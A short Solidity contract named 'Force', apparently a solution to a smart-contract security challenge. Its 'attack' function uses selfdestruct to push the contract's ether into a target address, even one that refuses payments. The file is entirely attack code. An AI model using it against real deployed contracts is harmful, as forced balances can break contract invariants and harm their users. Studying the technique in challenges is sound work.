// SPDX-License-Identifier: MIT

pragma solidity >=0.8.2 <0.9.0;

contract Force {
    constructor() payable {}

    function attack(address to) public {
        address payable addr = payable(to);
        selfdestruct(addr);
    }
}